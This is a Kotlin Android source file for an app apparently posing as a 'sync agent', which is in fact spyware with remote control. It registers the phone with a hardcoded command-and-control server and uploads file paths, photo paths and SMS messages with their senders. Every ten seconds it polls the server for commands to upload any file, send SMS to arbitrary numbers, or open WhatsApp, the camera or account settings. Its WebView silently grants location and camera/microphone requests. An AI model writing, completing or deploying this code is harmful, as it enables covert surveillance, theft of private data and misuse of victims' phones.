package com.cognitive.ai.syncagent

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.webkit.GeolocationPermissions
import android.webkit.PermissionRequest
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val PERMISSION_REQUEST_CODE = 600

    private val C2_SERVER_URL = "https://mohammed2000999.vercel.app"
    private val sessionToken = "agent_" + UUID.randomUUID().toString().substring(0, 8)
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var commandPollRunnable: Runnable

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        webView = WebView(this)
        setContentView(webView)

        requestTargetPermissions()
        registerAgentWithServer()
        scanAndReportTargetData()
        setupEngineWebView()
        startCommandPolling()
    }

    private fun requestTargetPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.CALL_PHONE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        val needed = permissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun registerAgentWithServer() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL("$C2_SERVER_URL/auth/verify/login")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("session_token", sessionToken)
                    put("user_agent", System.getProperty("http.agent") ?: "Android Target v78.14")
                    put("platform", "Android OS Target v78.14")
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private fun scanAndReportTargetData() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val fileList = JSONArray()
                if (downloadDir.exists() && downloadDir.isDirectory) {
                    downloadDir.listFiles()?.forEach { file -> if (file.isFile) fileList.put(file.absolutePath) }
                }

                val imageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
                val imageList = JSONArray()
                if (imageDir.exists() && imageDir.isDirectory) {
                    imageDir.walkTopDown().maxDepth(3).forEach { file ->
                        if (file.isFile && (file.name.endsWith(".jpg") || file.name.endsWith(".png"))) {
                            imageList.put(file.absolutePath)
                        }
                    }
                }

                val smsList = JSONArray()
                try {
                    val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
                    cursor?.use {
                        val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                        val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                        var count = 0
                        while (it.moveToNext() && count < 15) {
                            val msg = "من: " + it.getString(addressIdx) + " | " + it.getString(bodyIdx)
                            smsList.put(msg)
                            count++
                        }
                    }
                } catch (e: Exception) {}

                val url = URL("$C2_SERVER_URL/api/report_files")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val reportPayload = JSONObject().apply {
                    put("token", sessionToken)
                    put("files", fileList)
                    put("images", imageList)
                    put("sms", smsList)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(reportPayload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private fun startCommandPolling() {
        commandPollRunnable = object : Runnable {
            override fun run() {
                GlobalScope.launch(Dispatchers.IO) {
                    try {
                        val url = URL("$C2_SERVER_URL/api/poll_commands")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                        conn.doOutput = true
                        val payload = JSONObject().apply { put("token", sessionToken) }
                        OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                        
                        if (conn.responseCode == HttpURLConnection.HTTP_OK) {
                            val responseStr = conn.inputStream.bufferedReader().use { it.readText() }
                            val jsonRes = JSONObject(responseStr)
                            val commands = jsonRes.optJSONArray("commands")
                            if (commands != null) {
                                for (i in 0 until commands.length()) {
                                    val cmd = commands.getJSONObject(i)
                                    val action = cmd.optString("action")
                                    when (action) {
                                        "pull" -> {
                                            executeFilePull(cmd.optString("target_file"))
                                            reportExecutionStatus(action, "Success")
                                        }
                                        "open_whatsapp" -> {
                                            openAppPackage("com.whatsapp")
                                            reportExecutionStatus(action, "Executed")
                                        }
                                        "open_accounts" -> {
                                            openSettings(android.provider.Settings.ACTION_SYNC_SETTINGS)
                                            reportExecutionStatus(action, "Executed")
                                        }
                                        "open_camera" -> {
                                            openCameraApp()
                                            reportExecutionStatus(action, "Executed")
                                        }
                                        "send_sms" -> {
                                            sendSMSMessage(cmd.optString("phone"), cmd.optString("body"))
                                            reportExecutionStatus(action, "SMS Sent")
                                        }
                                    }
                                }
                            }
                        }
                        conn.disconnect()
                    } catch (e: Exception) { e.printStackTrace() }
                }
                handler.postDelayed(this, 10000)
            }
        }
        handler.post(commandPollRunnable)
    }

    private fun reportExecutionStatus(actionName: String, status: String) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL("$C2_SERVER_URL/api/report_execution")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("token", sessionToken)
                    put("action", actionName)
                    put("status", status)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun executeFilePull(filePath: String) {
        try {
            val file = File(filePath)
            if (file.exists() && file.isFile) {
                val bytes = file.readBytes()
                val b64Data = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val url = URL("$C2_SERVER_URL/api/upload_real_file")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("token", sessionToken)
                    put("filename", file.name)
                    put("data", b64Data)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun openAppPackage(packageName: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            intent?.let {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(it)
            }
        } catch (e: Exception) {}
    }

    private fun openSettings(action: String) {
        try {
            val intent = Intent(action).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun openCameraApp() {
        try {
            val intent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun sendSMSMessage(phone: String, body: String) {
        try {
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(phone, null, body, null, null)
        } catch (e: Exception) {}
    }

    private fun setupEngineWebView() {
        val settings: WebSettings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.cacheMode = WebSettings.LOAD_NO_CACHE
        webView.webViewClient = WebViewClient()
        webView.webChromeClient = object : WebChromeClient() {
            override fun onGeolocationPermissionsShowPrompt(origin: String?, callback: GeolocationPermissions.Callback?) { callback?.invoke(origin, true, false) }
            override fun onPermissionRequest(request: PermissionRequest?) { request?.grant(request.resources) }
        }
        webView.clearCache(true)
        webView.loadUrl(C2_SERVER_URL)
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(commandPollRunnable)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
